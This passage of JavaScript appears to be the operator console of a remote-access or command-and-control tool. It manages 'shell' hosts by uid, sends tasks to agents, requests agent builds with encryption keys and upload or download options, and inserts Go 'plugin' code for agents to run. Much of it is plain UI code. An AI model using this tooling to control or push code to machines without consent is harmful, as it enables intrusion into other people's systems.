                    "Params: " + parameters.join(", ") :
                    "Params: none";

                var descText = document.createElement("div");
                descText.className = "plugin-desc-line";
                descText.textContent = Array.isArray(parameterDesc) && parameterDesc.length > 0 ?
                    "Desc: " + parameterDesc.join(", ") :
                    "Desc: not set";

                metaText.appendChild(paramText);
                metaText.appendChild(descText);
                meta.appendChild(codeWordTag);
                meta.appendChild(metaText);

                var actions = document.createElement("div");
                actions.className = "plugin-item-actions";

                var toggleBtn = document.createElement("button");
                toggleBtn.type = "button";
                toggleBtn.className = "plugin-toggle-btn";
                toggleBtn.textContent = "Expand";

                var copyBtn = document.createElement("button");
                copyBtn.type = "button";
                copyBtn.className = "plugin-copy-btn";
                copyBtn.textContent = "Copy";
                copyBtn.onclick = function() {
                    navigator.clipboard
                    .writeText(codeStr)
                    .then(function() {
                        copyBtn.textContent = "Copied";
                        setTimeout(function() {
                            copyBtn.textContent = "Copy";
                        }, 1000);
                    })
                    .catch(function(err) {
                        console.error("copy plugin failed:", err);
                    });
                };

                var deleteBtn = document.createElement("button");
                deleteBtn.type = "button";
                deleteBtn.className = "plugin-delete-btn";
                deleteBtn.textContent = "Delete";
                deleteBtn.onclick = function() {
                    serverUi.deletePlugin(currentRemark, osKey, codeWord);
                };

                actions.appendChild(toggleBtn);
                actions.appendChild(copyBtn);
                actions.appendChild(deleteBtn);

                itemTop.appendChild(meta);
                itemTop.appendChild(actions);

                var codePreview = document.createElement("pre");
                codePreview.className = "plugin-code-preview";
                codePreview.textContent = codeStr;
                if (codeStr.length > 220 || codeStr.indexOf("\n") !== -1) {
                    codePreview.classList.add("collapsed");
                } else {
                    toggleBtn.style.display = "none";
                }

                toggleBtn.onclick = function() {
                    var expanded = codePreview.classList.toggle("expanded");
                    toggleBtn.textContent = expanded ? "Collapse" : "Expand";
                };

                pluginItem.appendChild(itemTop);
                pluginItem.appendChild(codePreview);
                groupList.appendChild(pluginItem);
            });

            groupCard.appendChild(groupList);
            section.appendChild(groupCard);
        });
    }
    async deletePlugin(remark, osName, codeWords) {
        if (!remark || !osName || !codeWords) {
            customAlert("remark, os or codeWords is missing");
            return false;
        }
        const confirmed = await customConfirm(
            "Delete plugin " + codeWords + " for " + remark + " / " + osName + " ?"
        );
        if (!confirmed) {
            return false;
        }
        const sent = await webSocketClient.send(
            "delPlugin",
            {
                remark: remark,
                os: osName,
                codeWords: codeWords
            }
        );
        if (!sent) {
            customAlert("delPlugin send failed");
            return false;
        }
        customLog("delPlugin sent:", {
            remark: remark,
            os: osName,
            codeWords: codeWords
        });
        return true;
    }

    async modifyServerHeader(port) {
        try {
            const server = Array.isArray(server_data) ?
                server_data.find((item) => String(item.port) === String(port)) :
                null;
            const currentHeader = server ?
                (server.response_head || server.responseHead || server.ResponseHead || "") :
                "";
            // 检查是否已加载样式
            if (!document.getElementById("modify-server-style")) {
                const styleLink = document.createElement("link");
                styleLink.id = "modify-server-style";
                styleLink.rel = "stylesheet";
                document.head.appendChild(styleLink);
            }
            // 创建弹出框
            const dialog = document.createElement("div");
            dialog.id = "modify-server-dialog";
            const closeButton = document.createElement("button");
            closeButton.type = "button";
            closeButton.className = "dialog-close-btn modify-server-close-btn";
            closeButton.textContent = "×";
            closeButton.setAttribute("aria-label", "Close response header dialog");
            closeButton.onclick = () => {
                document.body.removeChild(dialog);
            };
            dialog.appendChild(closeButton);
            // 标题
            const title = document.createElement("h3");
            title.textContent = "Edit Response Header (JSON)";
            dialog.appendChild(title);
            // 文本框
            const textarea = document.createElement("textarea");
            textarea.placeholder = "{\n  \"Content-Type\": \"application/json\",\n  \"Cache-Control\": \"no-cache\"\n}";
            if (currentHeader) {
                try {
                    const parsedHeader = JSON.parse(currentHeader);
                    textarea.value = JSON.stringify(parsedHeader, null, 2);
                } catch (e) {
                    textarea.value = currentHeader;
                }
            }
            dialog.appendChild(textarea);
            // 按钮容器
            const buttonContainer = document.createElement("div");
            buttonContainer.className = "button-container";
            // 保存按钮
            const saveButton = document.createElement("button");
            saveButton.textContent = "Save";
            saveButton.onclick = async () => {
                const newHeader = textarea.value.trim();
                if (newHeader !== "") {
                    try {
                        const parsedHeader = JSON.parse(newHeader);
                        if (!parsedHeader || Array.isArray(parsedHeader) || typeof parsedHeader !== "object") {
                            customAlert("Header must be a JSON object");
                            return;
                        }
                    } catch (err) {
                        customAlert("Invalid JSON format. Please check your input.");
                        console.error("Error modifying server header:", err);
                        return;
                    }
                }
                try {
                    const responsePromise = webSocketClient.waitForMessage(
                        (msg) => {
                            return msg.path === "changeResponseHead" &&
                                String(msg.port || "") === String(port);
                        },
                        15000
                    );
                    const sent = await webSocketClient.send(
                        "changeResponseHead",
                        {
                            port: port,
                            response_head: newHeader
                        }
                    );
                    if (!sent) {
                        customAlert("Send failed");
                        return;
                    }
                    const result = await responsePromise;
                    if (!result || result.code !== 200) {
                        customAlert(
                            result && result.message ?
                                result.message :
                                "Modify response header failed"
                        );
                        return;
                    }
                    if (server) {
                        server.response_head = newHeader;
                        server.responseHead = newHeader;
                        server.ResponseHead = newHeader;
                    }
                    customLog(
                        newHeader === "" ?
                            "Response header cleared successfully!" :
                            "Response header modified successfully!"
                    );
                    document.body.removeChild(dialog);
                } catch (err) {
                    customAlert("Modify response header failed");
                    console.error("Error modifying server header:", err);
                }
            };
            buttonContainer.appendChild(saveButton);

            dialog.appendChild(buttonContainer);
            document.body.appendChild(dialog);
        } catch (err) {
            console.error("Error modifying server header:", err);
        }
    }

    // 下载配置
    downloadConfig(port) {
        // 根据 port 找到对应的 server
        const server = server_data.find(server => server.port === port);
        if (!server) {
            customLog("Server not found for port: " + port);
            return;
        }
        // 转换为 JSON 字符串
        const configData = JSON.stringify(server, null, 4);
        // 创建 Blob 对象
        const blob = new Blob([configData], { type: "application/json" });
        const url = URL.createObjectURL(blob);
        // 创建下载链接
        const a = document.createElement("a");
        a.href = url;
        a.download = "server_config_" + port + ".json";
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        // 释放 URL
        URL.revokeObjectURL(url);
    }
    async redirectToAgentCode(protocol,os,server,path,connPath,msgPath,switch_key,encry_key,
        download,result,net,info,upload,list,option,user,uid,hostname,keyPart,filekey,code,windows_pro){
        try {
            console.log(protocol,os,server,path,connPath,msgPath,switch_key,encry_key,download,result,net,info,upload,list,option,user,uid,hostname,keyPart,filekey,code,windows_pro);
            webSocketClient.send(
                "agentcode",
                {
                    protocol: protocol,
                    os: os,
                    server: server,
                    Path: path,
                    ConnPath: connPath,
                    MsgPath: msgPath,
                    switch_key: switch_key,
                    encry_key: encry_key,
                    download: download,
                    result: result,
                    net: net,
                    info: info,
                    upload: upload,
                    list: list,
                    option: option,
                    username:Username,
                    user:user,
                    uid:uid,
                    hostname:hostname,
                    keyPart:keyPart,
                    filekey:filekey,
                    code:code,
                    group_pro:windows_pro || ""
                }
            );
        }catch(e){
            console.error(
                "generate agent code failed",
                e
            );
        }
    }
    checkAgent(data) {
        rebuildServerClientCounts(data);
    }
}

class lain_chat{
    renderChatItem(data) {
        console.log("renderChatItem:", data);
        if (!data) return;
        // 如果传入的是接口完整返回 {data: []}

        // 下面开始处理单条消息
        let chat_div = document.getElementById("chat_div");
        if (!chat_div) return;
    
        let div = document.createElement("div");
        div.className = "chat_message";
        div.setAttribute("data-chatid", data.chatid);
    
        // 自己的消息
        if (data.username === Username) {
            div.classList.add("me");
        }
    
        // 头部
        let header = document.createElement("div");
        header.style.display = "flex";
        header.style.justifyContent = "space-between";
        header.style.alignItems = "center";
    
        let usernameSpan = document.createElement("strong");
        usernameSpan.innerText = data.username;
    
        header.appendChild(usernameSpan);
    
        // 只有自己的消息显示删除按钮
        if (data.username === Username || data.username === "history fil") {
            let delBtn = document.createElement("span");
            delBtn.innerText = "×";
            delBtn.style.cssText =
                "cursor:pointer;color:#888;margin-left:8px;";
    
            delBtn.title = "delete";
    
            let currentChatId = data.chatid;
            let currentMessage = data.message;
            delBtn.onclick = () => {
                this.deleteChat(currentChatId, currentMessage);
            };
    
            header.appendChild(delBtn);
        }
    
        div.appendChild(header);
        // 消息内容
        if (data.type === "file") {
            let link = document.createElement("a");
            link.href = "javascript:void(0);";
            link.className = "file_link";
            link.innerText = "📎 " + data.message;
    
            link.style.color = "#007BFF";
            link.style.textDecoration = "none";
            link.onclick = () => {
                this.downloadChatFile(data.message);
            };
            let linkDiv = document.createElement("div");
            linkDiv.style.marginTop = "4px";
            linkDiv.appendChild(link);
            div.appendChild(linkDiv);
        } else {
            let msgDiv = document.createElement("div");
            msgDiv.style.marginTop = "4px";
            msgDiv.innerText = data.message;
            div.appendChild(msgDiv);
        }
        // 时间
        let timeSpan = document.createElement("span");
        timeSpan.className = "chat_time";
        timeSpan.innerText = data.time;
        div.appendChild(timeSpan);
        chat_div.appendChild(div);
        // 自动滚到底部
        chat_div.scrollTop = chat_div.scrollHeight;
    }
    async sendChat() {
        if (!chat_slice) {
            chat_slice = [];
        }
        let chat_input =
            document.getElementById("chat_input")
            .value
            .trim();
        if (chat_input === "") {
            return;
        }
        try {
            webSocketClient.send(
                "sendChat",
                {
                    username:Username,
                    message:chat_input,
                }
            );
        }catch(error){
            console.error(
                "Error in sendChat:",
                error
            );
        }
    }
    async deleteChat(chatid, message) {
        try {
            webSocketClient.send(
                "deleteChat",
                {
                    chatid: String(chatid),
                    username: Username,
                    message: message
                }
            );
        }catch(error){
            console.error(
                "Error in deleteChat:",
                error
            );
        }
    }
    async sendChatFile() {
        let fileInput = document.getElementById("chat_file");
        if(!fileInput.files.length){
            return;
        }
        let file = fileInput.files[0];
        let chatid = chat_slice.length > 0 ? chat_slice[chat_slice.length - 1].chatid + 1 : 1;
        let chat_div = document.getElementById("chat_div");
        let pendingDiv = document.createElement("div");
        pendingDiv.className = "chat_message me pending_file";
        pendingDiv.innerText =
            "📎 "
            + file.name
            + " ("
            + Math.round(file.size/1024)
            + " KB) - sending...";
        chat_div.appendChild(pendingDiv);
        chat_div.scrollTop =
            chat_div.scrollHeight;
        try{
            await webSocketClient.sendFile(
                "chatFile",
                {
                    filename:file.name,
                    chatid:String(chatid),
                    username:Username
                },
                file,
                1024 * 1024,
                (offset, total)=>{
                    let percent = total === 0
                        ? 100
                        : Math.min(
                            100,
                            Math.floor(offset / total * 100)
                        );
                    pendingDiv.innerText =
                        "📎 "
                        + file.name
                        + " "
                        + percent
                        + "%";
                }
            );
            pendingDiv.innerText =
                "📎 "
                + file.name
                + " uploaded";
        }catch(e){
            console.error(
                "upload error:",
                e
            );
            pendingDiv.innerText =
                "❌ "
                + file.name
                + " failed";
            pendingDiv.style.color="red";
        }
        fileInput.value="";
    }
    async downloadChatFile(filename){
        try {
            await webSocketClient.downloadFile(
                "downloadChatFile",
                {
                    filename: filename
                }
            );
        } catch(err){
            console.error(
                "download error:",
                err
            );
            customLog("Download failed");
        }
    }
}

function net_init() {
    try {
        const selectElement = document.getElementById('net_shell');
        if (!selectElement) {
            if (!window.netInitTimer) {
                window.netInitTimer = setInterval(function() {
                    if (net_init()) {
                        clearInterval(window.netInitTimer);
                        window.netInitTimer = null;
                    }
                }, 300);
            }
            return false;
        }
        if ((!Array.isArray(shell_list) || shell_list.length === 0) &&
            Array.isArray(User_data) && User_data.length > 0) {
            shell_list = User_data.slice();
            window.shell_list = shell_list;
        }
        if (!Array.isArray(shell_list) || shell_list.length === 0) {
            if (!window.netInitTimer) {
                window.netInitTimer = setInterval(function() {
                    if (net_init()) {
                        clearInterval(window.netInitTimer);
                        window.netInitTimer = null;
                    }
                }, 300);
            }
            return false;
        }
        const currentValue = selectElement.value;
        selectElement.innerHTML = '<option value="">Select</option>';
        shell_list.forEach(item => {
            if (!item || !item.uid) {
                return;
            }
            const option = document.createElement('option');
            option.value = item.uid; // UID
            const hostText = item.host || item.hostname || item.username || "";
            option.textContent = hostText ? (hostText + " (" + item.uid + ")") : item.uid;
            selectElement.appendChild(option);
        });
        if (currentValue) {
            selectElement.value = currentValue;
        }
        if (selectElement.dataset.netChangeBound !== "true") {
            selectElement.dataset.netChangeBound = "true";
            selectElement.addEventListener("change", function() {
                const net = new lain_net();
                net.requestNetData(this.value);
            });
        }
        if (window.netInitTimer) {
            clearInterval(window.netInitTimer);
            window.netInitTimer = null;
        }
        return true;
    } catch (error) {
        console.error("error:", error);
        return false;
    }
}
function toggleInfo(uid,op) {
    console.log(uid,op)
    if(op == "info"){
        var infoContent = document.getElementById(uid+"-info-content");
    }else if(op == "choose"){
        var infoContent = document.getElementById(uid+"-choose-content");
    }
    infoContent.classList.toggle("show");
}

// 打开 iframe
function openIframe(url) {
    var iframePanel = document.getElementById('iframePanel');
    var iframe = document.getElementById('iframe');
    iframe.src = url;
    iframePanel.style.display = 'block';
}

// 关闭 iframe
function closeIframe() {
    var iframePanel = document.getElementById('iframePanel');
    iframePanel.style.display = 'none';
}
// 切换侧边栏
function toggleSidebar() {
    const sidebar = document.querySelector('.sidebar');
    const button = document.querySelector('.toggle-button');
    const log = document.getElementById('log');
    const serverIndexDiv = document.querySelector(".server_index");
    const contentDiv = serverIndexDiv.querySelector(".content");
    sidebar.classList.toggle('shrink');
    if (sidebar.classList.contains('shrink')) {
        button.textContent = '>';
        log.style.left = '50px';
        log.style.width = 'calc(100% - 50px)';
        contentDiv.style.width = 'calc(100% - 50px)';
    } else {
        button.textContent = '<';
        log.style.left = '180px';
        log.style.width = 'calc(100% - 180px)';
        contentDiv.style.width = 'calc(100% - 180px)';
    }
}

// 窗口调整大小
document.addEventListener("DOMContentLoaded", function () {
    // **只调整 .server_index > .content 和 #log 的高度**
    const logDiv = document.getElementById("log");
    const logContent = document.getElementById("log-content");
    const logHandle = logDiv.querySelector(".resize-handle");
    const serverIndexDiv = document.querySelector(".server_index");
    const contentDiv = serverIndexDiv.querySelector(".content");
    let isResizingLog = false, startY, startContentHeight, startLogHeight, totalHeight;

    function startResize(e) {
        isResizingLog = true;
        startY = e.touches ? e.touches[0].clientY : e.clientY;
        startContentHeight = contentDiv.offsetHeight;
        startLogHeight = logDiv.offsetHeight;
        totalHeight = serverIndexDiv.offsetHeight;
        document.addEventListener("mousemove", resizeLog);
        document.addEventListener("mouseup", stopResize);
        document.addEventListener("touchmove", resizeLog);
        document.addEventListener("touchend", stopResize);
    }

    function resizeLog(e) {
        if (!isResizingLog) return;
        let currentY = e.touches ? e.touches[0].clientY : e.clientY;
        let deltaY = startY - currentY;
        let newContentHeight = Math.max(60, startContentHeight - deltaY);
        let minLogHeight = 20;
        let maxContentHeight = totalHeight - minLogHeight;
        if (newContentHeight > maxContentHeight) newContentHeight = maxContentHeight;
        contentDiv.style.height = newContentHeight + "px";
        logDiv.style.height = (totalHeight - newContentHeight) + "px";
    }

    function stopResize() {
        isResizingLog = false;
        document.removeEventListener("mousemove", resizeLog);
        document.removeEventListener("mouseup", stopResize);
        document.removeEventListener("touchmove", resizeLog);
        document.removeEventListener("touchend", stopResize);
    }

    // 初始化高度自适应
    function setInitialHeights() {
        const total = serverIndexDiv.offsetHeight;
        const contentH = Math.floor(total * 0.8);
        const logH = total - contentH;
        contentDiv.style.height = contentH + "px";
        logDiv.style.height = logH + "px";
    }
    setInitialHeights();
    window.addEventListener('resize', setInitialHeights);

    logHandle.addEventListener("mousedown", startResize);
    logHandle.addEventListener("touchstart", startResize);

    // **iframe 拖动**
    const iframePanel = document.getElementById("iframePanel");
    const dragHandle = iframePanel.querySelector(".drag-handle");
    let isDragging = false, offsetX, offsetY;

    function startDrag(e) {
        isDragging = true;
        offsetX = (e.touches ? e.touches[0].clientX : e.clientX) - iframePanel.offsetLeft;
        offsetY = (e.touches ? e.touches[0].clientY : e.clientY) - iframePanel.offsetTop;
        document.addEventListener("mousemove", dragMove);
        document.addEventListener("mouseup", stopDrag);
        document.addEventListener("touchmove", dragMove);
        document.addEventListener("touchend", stopDrag);
    }

    function dragMove(e) {
        if (!isDragging) return;
        let newX = (e.touches ? e.touches[0].clientX : e.clientX) - offsetX;
        let newY = (e.touches ? e.touches[0].clientY : e.clientY) - offsetY;
        const pageWidth = window.innerWidth, pageHeight = window.innerHeight;
        const panelWidth = iframePanel.offsetWidth, panelHeight = iframePanel.offsetHeight;
        if (newX < 0) newX = 0;
        else if (newX + panelWidth > pageWidth) newX = pageWidth - panelWidth;
        if (newY < 0) newY = 0;
        else if (newY + panelHeight > pageHeight) newY = pageHeight - panelHeight;
        iframePanel.style.left = newX + "px";
        iframePanel.style.top = newY + "px";
    }

    function stopDrag() {
        isDragging = false;
        document.removeEventListener("mousemove", dragMove);
        document.removeEventListener("mouseup", stopDrag);
        document.removeEventListener("touchmove", dragMove);
        document.removeEventListener("touchend", stopDrag);
    }

    dragHandle.addEventListener("mousedown", startDrag);
    dragHandle.addEventListener("touchstart", startDrag);

    // **侧边栏导航**
    const links = document.querySelectorAll(".sidebar a, .tle-sidebar a");
    const sections = document.querySelectorAll(".content > div");

    function showSection(targetId) {
        sections.forEach(section => {
            section.classList.toggle("hidden", section.id !== targetId);
        });
    }

    links.forEach(link => {
        link.addEventListener("click", function (e) {
            e.preventDefault();
            showSection(this.getAttribute("data-target"));
        });
        link.addEventListener("touchstart", function (e) {
            e.preventDefault();
            showSection(this.getAttribute("data-target"));
        });
    });

    // **默认选中第一个**
    if (links.length > 0) {
        showSection(links[0].getAttribute("data-target"));
    }
});

document.addEventListener('DOMContentLoaded', function () {
    // 选择电脑端和手机端的侧边栏
    const links = document.querySelectorAll('.sidebar a, .tle-sidebar a');
    const sections = document.querySelectorAll('.content > div');
    // 为每个链接添加点击事件
    links.forEach(link => {
        link.addEventListener('click', function (e) {
            e.preventDefault();
            const targetId = this.getAttribute('data-target');
            sections.forEach(section => {
                if (section.id === targetId) {
                    section.classList.remove('hidden');
                } else {
                    section.classList.add('hidden');
                }
            });
        });
    });
    // 侧边栏显示/隐藏按钮事件
    document.getElementById("tel-toggleBtn").addEventListener("click", function() {
        const sidebar = document.getElementById("tle-sidebar");
        if (sidebar.style.display === "none" || sidebar.style.display === "") {
            sidebar.style.display = "block";
            this.textContent = "🔽";
        } else {
            sidebar.style.display = "none";
            this.textContent = "📋";
        }
    });
});
function showPluginDialog(uid, os, paramDescList, codeword) {
    // 解析参数
    let paramDescArray = paramDescList ? decodeURIComponent(paramDescList).split(',') : [];
    if (!uid || !os || !paramDescList || !codeword) {
        customAlert("Missing required parameters for plugin dialog.");
        return;
    }

    // 弹窗容器
    let dialog = document.getElementById("plugin-dialog");
    if (!dialog) {
        dialog = document.createElement("form");
        dialog.id = "plugin-dialog";
        dialog.style.position = "fixed";
        dialog.style.top = "10%";
        dialog.style.left = "50%";
        dialog.style.transform = "translateX(-50%)";
        dialog.style.background = "#f9f9f9";
        dialog.style.zIndex = 9999;
        dialog.style.maxWidth = "95vw";
        dialog.style.width = "95%";
        dialog.style.margin = "40px auto";
        dialog.style.border = "1px solid #ccc";
        dialog.style.borderRadius = "8px";
        dialog.style.boxShadow = "0 2px 8px rgba(0,0,0,0.2)";
        dialog.style.padding = "16px";
        document.body.appendChild(dialog);
    } else {
        dialog.innerHTML = ""; // 清空旧内容
    }

    // 关闭按钮
    let closeBtn = document.createElement("button");
    closeBtn.type = "button";
    closeBtn.textContent = "close";
    closeBtn.style.float = "right";
    closeBtn.onclick = function() {
        dialog.remove();
    };
    dialog.appendChild(closeBtn);

    // 参数输入框
    paramDescArray.forEach(desc => {
        let input = document.createElement('input');
        input.type = 'text';
        input.placeholder = desc;
        input.style.display = "block";
        input.style.margin = "8px 0";
        input.style.width = "90%";
        input.style.padding = "8px";
        input.style.boxSizing = "border-box";
        dialog.appendChild(input);
    });

    // 提交按钮
    let submitButton = document.createElement('button');
    submitButton.textContent = 'send';
    submitButton.style.padding = "10px 20px";
    submitButton.style.marginTop = "12px";
    submitButton.style.cursor = "pointer";
    submitButton.type = "button";
    submitButton.onclick = function(event) {
        event.preventDefault();
        sendMsg();
    };
    dialog.appendChild(submitButton);

    // 发送消息函数
    async function sendMsg() {
        let inputs = dialog.querySelectorAll('input[type="text"]');
        let msgParts = [];
        for (let input of inputs) {
            let value = input.value.trim();
            if (!value) {
                customAlert("Please fill in all fields.");
                return;
            }
            msgParts.push(value);
        }
        let msg = codeword + '*//*' + msgParts.join('*//*');
        try {
            const taskid = createRuntimeTaskId("plugin");
            let result = await webSocketClient.send(
                "msg",
                {
                    uid: uid,
                    msg: msg,
                    Taskid: taskid
                }
            );
            if (!result) {
                customAlert("Message send failed");
                return;
            }
            customLog("Message sent successfully!");
            inputs.forEach(input => {
                input.value = '';
            });
        } catch(error) {
            console.error(
                "Failed to send message:",
                error
            );
            customLog(
                "Failed to send message: " + error.message
            );
        }
    }
}
async function submitPlugin(remark) {
    const dialog = document.getElementById("serverDialog");
    if (!dialog) {
        customAlert("Plugin dialog not found");
        return false;
    }
    const finalRemark = (remark || dialog.dataset.remark || "").trim();
    const osSelect = dialog.querySelector("#select_os");
    const codeWordInput = dialog.querySelector("input[name='codeWord']");
    const codeInput = dialog.querySelector("input[name='code']");
    const parameterCountInput = dialog.querySelector("#parameterHidden");
    const parameterDescInput = dialog.querySelector("input[name='parameterDec']");

    const osName = osSelect ? osSelect.value.trim() : "";
    const codeWords = codeWordInput ? codeWordInput.value.trim() : "";
    const rawCode = codeInput ? codeInput.value.trim() : "";
    const parameterDesc = parameterDescInput ? parameterDescInput.value.trim() : "";
    const parameterCount = parameterCountInput ?
        Math.max(1, parseInt(parameterCountInput.value, 10) || 1) :
        1;
    const codeParts = Array.from(
        { length: parameterCount },
        function(_, index) {
            return "msg" + (index + 1);
        }
    );
    const parameter = codeParts.join(",");

    if (!finalRemark || !rawCode || !osName) {
        customAlert("remark, code and os are required");
        return false;
    }
    if (!codeWords) {
        customAlert("codeWord is required");
        return false;
    }
    if (!parameterDesc) {
        customAlert("parameter description is required");
        return false;
    }

    const submitBtn = dialog.querySelector("#submitBtn");
    if (submitBtn) {
        submitBtn.disabled = true;
    }
    try {
        const parameterDescArray = parameterDesc.split(",").map(function(part) {
            return part.trim();
        }).filter(function(part) {
            return part !== "";
        });
        while (parameterDescArray.length < parameterCount) {
            parameterDescArray.push("null");
        }
        const normalizedParameterDesc = parameterDescArray.join(",");
        const funcParams = codeParts.map(function(part) {
            return part + " string";
        }).join(", ");
        const callParams = codeParts.map(function(_, index) {
            return "msg[" + (index + 1) + "]";
        }).join(", ");
        let finalCodeBody = rawCode;
        for (let i = 1; i <= parameterCount; i++) {
            const regex = new RegExp("msg-" + i, "g");
            finalCodeBody = finalCodeBody.replace(regex, "msg" + i);
        }
        const finalCode = 'case "' + codeWords + '":\n    go func(' +
            funcParams +
            ') {' +
            finalCodeBody +
            '}(' +
            callParams +
            ')';
        const sent = await webSocketClient.send(
            "insertPlugin",
            {
                remark: finalRemark,
                code: finalCode,
                codeWords: codeWords,
                os: osName,
                parameter: parameter,
                parameterDesc: normalizedParameterDesc
            }
        );
        if (!sent) {
            customAlert("insertPlugin send failed");
            return false;
        }
        customLog("insertPlugin sent:", {
            remark: finalRemark,
            os: osName,
            codeWords: codeWords,
            parameter: parameter,
            parameterDesc: normalizedParameterDesc,
            code: finalCode
        });
        return true;
    } catch (err) {
        customAlert("insertPlugin failed: " + err.message);
        return false;
    } finally {
        if (submitBtn) {
            submitBtn.disabled = false;
        }
    }
}
window.submitPlugin = submitPlugin;
function formatCustomLogValue(value) {
    if (typeof value === "string") {
        return value;
    }
    if (value instanceof Error) {
        return value.stack || value.message;
    }
    if (typeof value === "undefined") {
        return "undefined";
    }
    if (value === null) {
        return "null";
    }
    try {
        return JSON.stringify(value, null, 2);
    } catch (err) {
        return String(value);
    }
}
function customLog() {
    let container = document.getElementById("custom-log-container");
    if (!container) {
        container = document.createElement("div");
        container.id = "custom-log-container";
        container.style.position = "fixed";
        container.style.right = "20px";
        container.style.top = "20px";
        container.style.width = "360px";
        container.style.maxWidth = "calc(100vw - 24px)";
        container.style.maxHeight = "50vh";
        container.style.overflowY = "auto";
        container.style.zIndex = "9998";
        container.style.display = "flex";
        container.style.flexDirection = "column";
        container.style.gap = "10px";
        document.body.appendChild(container);
    }

    const args = Array.from(arguments);
    const item = document.createElement("div");
    item.style.background = "rgba(255, 255, 255, 0.96)";
    item.style.color = "#2f2f2f";
    item.style.border = "1px solid rgba(120, 150, 180, 0.22)";
    item.style.borderRadius = "10px";
    item.style.padding = "12px 14px";
    item.style.boxShadow = "0 10px 28px rgba(80, 102, 125, 0.18)";
    item.style.fontFamily = "Consolas, Monaco, monospace";
    item.style.fontSize = "12px";
    item.style.lineHeight = "1.5";
    item.style.wordBreak = "break-word";
    item.style.opacity = "0";
    item.style.transform = "translateY(-10px)";
    item.style.transition = "opacity 0.6s ease, transform 0.6s ease";

    const header = document.createElement("div");
    header.style.display = "flex";
    header.style.justifyContent = "space-between";
    header.style.alignItems = "center";
    header.style.marginBottom = "6px";

    const timeLabel = document.createElement("span");
    timeLabel.textContent = new Date().toLocaleTimeString();
    timeLabel.style.color = "#4c84b8";
    timeLabel.style.fontSize = "11px";

    const closeButton = document.createElement("button");
    closeButton.type = "button";
    closeButton.textContent = "x";
    closeButton.style.border = "none";
    closeButton.style.background = "transparent";
    closeButton.style.color = "#7e8a96";
    closeButton.style.cursor = "pointer";
    closeButton.style.fontSize = "14px";
    closeButton.onclick = function() {
        if (item.parentNode) {
            item.parentNode.removeChild(item);
        }
    };

    header.appendChild(timeLabel);
    header.appendChild(closeButton);

    const content = document.createElement("pre");
    content.textContent = args.map(formatCustomLogValue).join(" ");
    content.style.margin = "0";
    content.style.whiteSpace = "pre-wrap";
    content.style.wordBreak = "break-word";

    item.appendChild(header);
    item.appendChild(content);
    container.appendChild(item);
    requestAnimationFrame(() => {
        item.style.opacity = "1";
        item.style.transform = "translateY(0)";
    });

    while (container.children.length > 12) {
        container.removeChild(container.firstChild);
    }

    container.scrollTop = container.scrollHeight;

    let fadeTimer = null;
    let removeTimer = null;
    const startFadeOut = function() {
        item.style.opacity = "0";
        item.style.transform = "translateY(-6px)";
        removeTimer = setTimeout(() => {
            if (item.parentNode) {
                item.parentNode.removeChild(item);
            }
        }, 650);
    };
    const scheduleFadeOut = function() {
        clearTimeout(fadeTimer);
        clearTimeout(removeTimer);
        fadeTimer = setTimeout(startFadeOut, 4500);
    };
    item.onmouseenter = function() {
        clearTimeout(fadeTimer);
        clearTimeout(removeTimer);
        item.style.opacity = "1";
        item.style.transform = "translateY(0)";
    };
    item.onmouseleave = function() {
        scheduleFadeOut();
    };
    scheduleFadeOut();
}
// 替代alert函数，使用自定义弹窗
function customAlert(message) {
    // 遮罩
    let overlay = document.createElement("div");
    overlay.style.position = "fixed";
    overlay.style.inset = "0";
    overlay.style.background = "rgba(0,0,0,0.35)";
    overlay.style.zIndex = "9999";

    // 弹窗
    let alertBox = document.createElement("div");
    alertBox.style.position = "fixed";
    alertBox.style.top = "50%";
    alertBox.style.left = "50%";
    alertBox.style.transform = "translate(-50%, -50%)";
    alertBox.style.background = "#fff";
    alertBox.style.width = "500px";
    alertBox.style.maxWidth = "85%";
    alertBox.style.maxHeight = "70vh";
    alertBox.style.borderRadius = "12px";
    alertBox.style.boxShadow = "0 10px 30px rgba(0,0,0,0.25)";
    alertBox.style.padding = "20px";
    alertBox.style.zIndex = "10000";
    alertBox.style.fontFamily = "Arial, sans-serif";
    alertBox.style.overflow = "auto";

    // 关闭按钮
    let closeButton = document.createElement("button");
    closeButton.innerHTML = "×";
    closeButton.style.position = "absolute";
    closeButton.style.right = "12px";
    closeButton.style.top = "8px";
    closeButton.style.width = "32px";
    closeButton.style.height = "32px";
    closeButton.style.border = "none";
    closeButton.style.background = "transparent";
    closeButton.style.fontSize = "26px";
    closeButton.style.cursor = "pointer";
    closeButton.style.color = "#666";
    closeButton.onmouseenter = () => {
        closeButton.style.color = "#000";
    };
    closeButton.onmouseleave = () => {
        closeButton.style.color = "#666";
    };
    closeButton.onclick = function () {
        document.body.removeChild(overlay);
    };
    alertBox.appendChild(closeButton);
    // 内容
    let messageText = document.createElement("pre");
    messageText.textContent = message;
    messageText.style.textAlign = "left";
    messageText.style.whiteSpace = "pre-wrap";
    messageText.style.wordBreak = "break-word";
    messageText.style.fontSize = "14px";
    messageText.style.lineHeight = "1.5";
    messageText.style.marginTop = "25px";
    messageText.style.color = "#333";
    alertBox.appendChild(messageText);
    overlay.appendChild(alertBox);
    document.body.appendChild(overlay);
    // 点击遮罩关闭
    overlay.onclick = function(e) {
        if (e.target === overlay) {
            document.body.removeChild(overlay);
        }
    };
}
function customConfirm(message) {
    return new Promise((resolve) => {
        // 遮罩
        let overlay = document.createElement("div");
        overlay.style.position = "fixed";
        overlay.style.inset = "0";
        overlay.style.background = "rgba(0,0,0,0.35)";
        overlay.style.zIndex = "9999";

        // 弹窗
        let confirmBox = document.createElement("div");
        confirmBox.style.position = "fixed";
        confirmBox.style.top = "50%";
        confirmBox.style.left = "50%";
        confirmBox.style.transform = "translate(-50%, -50%)";
        confirmBox.style.background = "#fff";
        confirmBox.style.width = "400px";
        confirmBox.style.maxWidth = "85%";
        confirmBox.style.borderRadius = "12px";
        confirmBox.style.boxShadow = "0 10px 30px rgba(0,0,0,0.25)";
        confirmBox.style.padding = "25px";
        confirmBox.style.zIndex = "10000";
        confirmBox.style.fontFamily = "Arial, sans-serif";
        confirmBox.style.textAlign = "center";

        // 内容
        let messageText = document.createElement("div");
        messageText.textContent = message;
        messageText.style.fontSize = "16px";
        messageText.style.color = "#333";
        messageText.style.marginBottom = "25px";
        messageText.style.whiteSpace = "pre-wrap";

        confirmBox.appendChild(messageText);

        // 按钮容器
        let buttonBox = document.createElement("div");
        buttonBox.style.display = "flex";
        buttonBox.style.justifyContent = "center";
        buttonBox.style.gap = "20px";

        // 确定按钮
        let okButton = document.createElement("button");
